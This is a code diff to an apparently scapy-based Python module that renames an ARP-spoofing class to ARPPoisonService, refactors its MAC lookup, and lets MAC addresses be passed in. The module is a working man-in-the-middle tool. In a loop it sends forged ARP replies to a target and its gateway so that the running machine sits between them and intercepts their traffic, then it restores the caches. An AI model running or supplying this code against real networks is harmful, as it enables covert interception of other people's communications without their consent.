@@ -14,9 +14,9 @@ logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S
 logger = logging.getLogger()
 
 
-class MITMService:
+class ARPPoisonService:
     @staticmethod
-    def _get_mac(target_ip, mac_resolve_max_tries):
+    def get_mac(target_ip, mac_resolve_max_tries):
         """
         queries network for MAC address corresponding to :param target_ip
         :param target_ip: IP address
@@ -31,10 +31,10 @@ class MITMService:
 
             logger.info("sending who-has for {}".format(target_ip))
             arp_request = Ether(dst=BROADCAST_MAC) / ARP(op=ARP_REQUEST, pdst=target_ip)
-            arp_response = srp(arp_request, timeout=ARP_REQUEST_TIMEOUT, verbose=False)[0]
+            arp_response = srp1(arp_request, timeout=ARP_REQUEST_TIMEOUT, verbose=False)
             try_count += 1
 
-        target_mac = arp_response[0][0][1].hwsrc
+        target_mac = arp_response[ARP].hwsrc
         logger.info("got mac: {}".format(target_mac))
         return target_mac
 
@@ -54,17 +54,17 @@ class MITMService:
         reset = ARP(op=ARP_REPLY, hwsrc=source_mac, psrc=source_ip, hwdst=target_mac, pdst=target_ip)
         send(reset, verbose=False)
 
-    def __init__(self, target_ip, gateway_ip, interval=5, mac_resolve_max_tries=5):
+    def __init__(self, target_ip, gateway_ip, target_mac=None, gateway_mac=None, interval=5, mac_resolve_max_tries=5):
         """
         :param target_ip: will intercept requests from this IP
         :param gateway_ip: will intercept responses from this IP (directed at :param target_ip)
         :param interval: how often to run arp poison
         """
         self.target_ip = target_ip
-        self.target_mac = MITMService._get_mac(self.target_ip, mac_resolve_max_tries)
+        self.target_mac = target_mac or type(self).get_mac(self.target_ip, mac_resolve_max_tries)
 
         self.gateway_ip = gateway_ip
-        self.gateway_mac = MITMService._get_mac(self.gateway_ip, mac_resolve_max_tries)
+        self.gateway_mac = gateway_mac or ARPPoisonService.get_mac(self.gateway_ip, mac_resolve_max_tries)
 
         self.interval = interval
         self._should_spoof = False
@@ -75,16 +75,16 @@ class MITMService:
         inserts this machine between target_ip and gateway_ip
         """
         while self._should_spoof:
-            MITMService._poison_arp_cache(self.target_ip, self.target_mac, self.gateway_ip)
-            MITMService._poison_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip)
+            type(self)._poison_arp_cache(self.target_ip, self.target_mac, self.gateway_ip)
+            type(self)._poison_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip)
             sleep(self.interval)
 
     def _restore_normal_arp(self):
         """
         resets ip/mac mapping so that gateway ip resolves to gateway mac, and target ip resolves to target mac
         """
-        MITMService._reset_arp_cache(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
-        MITMService._reset_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)
+        type(self)._reset_arp_cache(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
+        type(self)._reset_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)
 
     def start_mitm(self):
         logger.info("starting spoof")
